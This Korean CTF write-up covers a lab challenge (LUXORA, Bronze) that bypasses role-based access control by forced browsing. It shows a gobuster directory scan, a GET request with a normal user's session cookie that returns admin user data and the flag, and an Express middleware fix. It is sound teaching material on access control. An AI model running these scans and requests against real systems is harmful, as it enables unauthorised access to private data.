+++
title = "VulnABLE CTF [LUXORA] Write-up: RBAC Bypass 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "RBAC", "Bronze", "Access Control", "API", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: RBAC Bypass 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Access Control Layer (RBAC Bypass)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/rbac/bronze` (또는 `/api/admin/users`)
- **목표**: 프론트엔드 UI에서는 숨겨져 있는 관리자 전용 API(Application Programming Interface) 엔드포인트를 강제 브라우징(Forced Browsing)하여 일반 유저 권한으로 접근하고 데이터를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

시스템에 일반 사용자 계정(`user` / `password123`)으로 로그인합니다.
일반 사용자 화면에는 "My Profile"과 "Logout" 버튼만 보이며, 관리자 전용 메뉴는 보이지 않습니다.

**[해커의 사고 과정]**
1. 최신 웹(특히 SPA - Single Page Application)에서는 사용자 권한에 따라 프론트엔드 버튼(UI)만 숨겨놓고, 실제 백엔드 API에는 권한 검사를 누락하는 실수를 자주 저지른다.
2. 관리자만이 쓸 수 있는 백엔드 API 경로가 무엇인지 추측(Guessing)해보자.
3. 보통 `/admin`, `/api/admin`, `/admin/users`, `/manage` 같은 경로를 많이 쓴다.

### 💡 디렉터리 브루트포싱 (DirBuster / Gobuster)
API 경로를 찾기 위해 `gobuster`를 활용하여 디렉터리를 스캔해봅니다.

```bash
$ gobuster dir -u http://localhost:3000/api -w /usr/share/wordlists/dirb/common.txt
```

**[검색 결과]**
```text
/profile (Status: 200)
/settings (Status: 200)
/admin (Status: 200)      <-- 관리자 라우트 발견!
```

---

## 💥 2. 취약점 식별 및 강제 접근 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Normal User ] --(GET /api/admin/users)--> [ Web Server ]
                                            |-- Missing Role Check
                                            |-- Returns Admin Data
```


스캔을 통해 발견한 `/api/admin` 경로의 하위 엔드포인트들을 유추해 봅니다. 관리자라면 전체 사용자 목록을 보는 기능이 있을 것입니다.

### 페이로드 전송 (Forced Browsing)
Burp Suite나 Postman, 혹은 단순히 브라우저 주소창에 직접 URL을 쳐서 접근을 시도합니다. 내 브라우저에는 여전히 일반 유저(`user`)의 세션 쿠키가 담겨 있습니다.

```http
GET /api/admin/users HTTP/1.1
Host: localhost:3000
Cookie: session_id=user_session_token_xyz
```

### 🔍 서버의 응답
서버는 이 요청을 보낸 사람이 "로그인은 했는지(Authentication)"는 검사했지만, "관리자 권한이 있는지(Authorization)"는 검사하지 않고 데이터를 내어줍니다!

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "data": [
    {"id": 1, "username": "admin_super", "email": "admin@luxora.test"},
    {"id": 2, "username": "user", "email": "user@luxora.test"}
  ],
  "flag": "FLAG{RBAC_🥉_FORCED_BROWSING_A1B2C3}"
}
```

---

## 🚩 3. 롸잇업 결론 및 플래그

UI(버튼)만 숨기면 안전할 것이라는 개발자의 "Security by Obscurity(모호함을 통한 보안)" 심리를 파고들어, API 엔드포인트에 직접 접근(Insecure Direct Object Reference / Missing Function Level Access Control)하여 데이터를 유출했습니다.

**🔥 획득한 플래그:**
`FLAG{RBAC_🥉_FORCED_BROWSING_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
프론트엔드에서의 UI 은닉은 보안이 아닙니다. 해커는 브라우저를 통하지 않고 cURL이나 Burp Suite를 통해 API 서버와 직접 대화하기 때문입니다.

* **취약한 백엔드 코드 (인증만 하고 인가를 안 함)**
```javascript
// 로그인이 되어 있는지만 확인 (일반 유저도 통과)
app.get('/api/admin/users', requireLogin, (req, res) => {
    const users = db.getAllUsers();
    res.json(users);
});
```

* **안전한 패치 가이드 (강력한 인가 Middleware 적용)**
모든 관리자용 라우트 앞에는 반드시 사용자의 Role(역할)이 `admin`인지 검사하는 미들웨어(Middleware)가 존재해야 합니다.

```javascript
// 권한(Role)을 확인하는 미들웨어 작성
function requireAdmin(req, res, next) {
    if (req.session.role !== 'admin') {
        return res.status(403).json({ error: "Forbidden: Admin privileges required" });
    }
    next(); // 관리자일 때만 다음 로직으로 넘어감
}

// 라우트에 미들웨어 적용
app.get('/api/admin/users', requireLogin, requireAdmin, (req, res) => {
    ...
});
```
이렇게 수정하면 일반 유저가 직접 URL을 치고 들어와도, `requireAdmin` 필터에 걸려 403 에러가 반환되며 접근이 원천 차단됩니다.